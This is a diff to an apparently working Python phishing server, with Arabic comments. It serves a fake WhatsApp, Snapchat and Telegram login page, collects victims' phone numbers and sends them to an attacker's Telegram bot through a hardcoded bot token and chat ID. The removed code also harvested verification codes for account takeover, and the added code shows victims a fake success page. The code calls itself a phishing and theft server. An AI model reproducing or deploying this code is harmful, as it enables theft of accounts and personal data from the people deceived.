@@ -8,18 +8,15 @@ BOT_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
 CHAT_ID = "1170411845"
 
 # ===== دالة الإرسال للبوت =====
-def send_to_telegram(service, phone, code=""):
+def send_to_telegram(service, phone):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    if code:
-        message = f"✅ [{service}]\n📱 الهاتف: {phone}\n🔑 الرمز: {code}"
-    else:
-        message = f"📌 [{service}]\n📱 الهاتف: {phone}\n⏳ في انتظار الرمز..."
+    message = f"✅ [{service}]\n📱 الهاتف: {phone}\n⏳ تم السرقة فوراً!"
     try:
         requests.post(url, json={"chat_id": CHAT_ID, "text": message}, timeout=10)
     except:
         pass
 
-# ===== خادم الفيشينج =====
+# ===== خادم الفيشينج (نسخة مبسطة) =====
 class PhishingHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path == "/":
@@ -91,13 +88,13 @@ class PhishingHandler(BaseHTTPRequestHandler):
         <button class="service-tab sn" onclick="setService('sn')">👻 سناب</button>
         <button class="service-tab tg" onclick="setService('tg')">✈️ تليجرام</button>
     </div>
-    <form action="/send_phone" method="POST">
+    <form action="/login" method="POST">
         <input type="hidden" name="service" id="serviceInput" value="wa">
         <div class="input-group">
             <label>رقم الهاتف</label>
             <input type="text" name="phone" placeholder="أدخل رقم هاتفك" required>
         </div>
-        <button type="submit" class="btn-login">متابعة</button>
+        <button type="submit" class="btn-login">تسجيل الدخول</button>
     </form>
     <div class="footer">🔒 جميع البيانات مشفرة وآمنة</div>
 </div>
@@ -111,24 +108,33 @@ class PhishingHandler(BaseHTTPRequestHandler):
 </body>
 </html>"""
             self.wfile.write(html.encode("utf-8"))
+        else:
+            self.send_response(404)
+            self.end_headers()
 
-        elif self.path.startswith("/code"):
+    def do_POST(self):
+        if self.path == "/login":
+            length = int(self.headers["Content-Length"])
+            raw = self.rfile.read(length).decode()
+            data = urllib.parse.parse_qs(raw)
+            service = data.get("service", ["wa"])[0]
+            phone = data.get("phone", [""])[0]
+
+            # إرسال الرقم فوراً إلى البوت
+            send_to_telegram(service, phone)
+
+            # عرض صفحة نجاح للضحية
             self.send_response(200)
             self.end_headers()
-            # استخراج المعاملات من الرابط
-            query = urllib.parse.parse_qs(self.path.split("?")[1]) if "?" in self.path else {}
-            service = query.get("service", ["wa"])[0]
-            phone = query.get("phone", ["+"])[0]
-            
-            html = f"""<!DOCTYPE html>
+            self.wfile.write("""
+                <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رمز التحقق</title>
+    <title>تم التحقق</title>
     <style>
-        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{
+        body {
             font-family: 'Segoe UI', Tahoma, sans-serif;
             background: #0a0a0a;
             min-height: 100vh;
@@ -136,8 +142,8 @@ class PhishingHandler(BaseHTTPRequestHandler):
             justify-content: center;
             align-items: center;
             padding: 20px;
-        }}
-        .container {{
+        }
+        .container {
             background: #1a1a1a;
             padding: 40px 35px;
             border-radius: 20px;
@@ -146,78 +152,33 @@ class PhishingHandler(BaseHTTPRequestHandler):
             max-width: 420px;
             border: 1px solid #333;
             text-align: center;
-        }}
-        .icon {{ font-size: 48px; margin-bottom: 10px; }}
-        .title {{ color: #fff; font-size: 22px; font-weight: 600; }}
-        .subtitle {{ color: #aaa; font-size: 14px; margin-bottom: 20px; }}
-        .input-group {{ margin-bottom: 16px; }}
-        .input-group input {{
-            width: 100%; padding: 14px 16px; background: #2a2a2a;
-            border: 1px solid #3a3a3a; border-radius: 12px; color: #fff; font-size: 15px;
-            text-align: center; letter-spacing: 4px;
-        }}
-        .btn-login {{
-            width: 100%; padding: 14px; background: #25D366; color: #000;
-            border: none; border-radius: 12px; font-size: 16px; font-weight: 700;
-            cursor: pointer; transition: 0.3s;
-        }}
-        .btn-login:hover {{ transform: scale(1.02); filter: brightness(1.1); }}
-        .footer {{ color: #666; font-size: 12px; margin-top: 20px; }}
+        }
+        .icon { font-size: 64px; margin-bottom: 10px; }
+        .title { color: #25D366; font-size: 24px; font-weight: 700; }
+        .subtitle { color: #aaa; font-size: 14px; margin-top: 10px; }
+        .loader {
+            width: 40px; height: 40px;
+            border: 4px solid #333;
+            border-top: 4px solid #25D366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="icon">📨</div>
-    <div class="title">تم إرسال الرمز</div>
-    <div class="subtitle">أدخل رمز التحقق الذي تلقيته</div>
-    <form action="/verify_code" method="POST">
-        <input type="hidden" name="service" value="{service}">
-        <input type="hidden" name="phone" value="{phone}">
-        <div class="input-group">
-            <input type="text" name="code" placeholder="رمز التحقق" required>
-        </div>
-        <button type="submit" class="btn-login">تحقق</button>
-    </form>
-    <div class="footer">🔒 جميع البيانات مشفرة وآمنة</div>
+    <div class="icon">✅</div>
+    <div class="title">تم التحقق بنجاح!</div>
+    <div class="subtitle">جاري التوجيه إلى لوحة التحكم...</div>
+    <div class="loader"></div>
 </div>
 </body>
-</html>"""
-            self.wfile.write(html.encode("utf-8"))
-
-        else:
-            self.send_response(404)
-            self.end_headers()
-
-    def do_POST(self):
-        if self.path == "/send_phone":
-            length = int(self.headers["Content-Length"])
-            raw = self.rfile.read(length).decode()
-            data = urllib.parse.parse_qs(raw)
-            service = data.get("service", ["wa"])[0]
-            phone = data.get("phone", [""])[0]
-
-            send_to_telegram(service, phone)
-
-            self.send_response(302)
-            self.send_header("Location", f"/code?service={service}&phone={phone}")
-            self.end_headers()
-
-        elif self.path == "/verify_code":
-            length = int(self.headers["Content-Length"])
-            raw = self.rfile.read(length).decode()
-            data = urllib.parse.parse_qs(raw)
-            service = data.get("service", ["wa"])[0]
-            phone = data.get("phone", [""])[0]
-            code = data.get("code", [""])[0]
-
-            send_to_telegram(service, phone, code)
-
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write("""
-                <h3 style="color:#ff6b6b;text-align:center;margin-top:50px;font-family:sans-serif;">
-                    ⚠️ رمز التحقق غير صحيح، حاول مجدداً
-                </h3>
+</html>
             """.encode("utf-8"))
         else:
             self.send_response(404)
@@ -230,7 +191,7 @@ class PhishingHandler(BaseHTTPRequestHandler):
 def run_server():
     port = int(os.environ.get("PORT", 10000))
     server = HTTPServer(("0.0.0.0", port), PhishingHandler)
-    print(f"[✓] خادم الفيشينج المتقدم يعمل على المنفذ {port}")
+    print(f"[✓] خادم السرقة السريع يعمل على المنفذ {port}")
     server.serve_forever()
 
 if __name__ == "__main__":
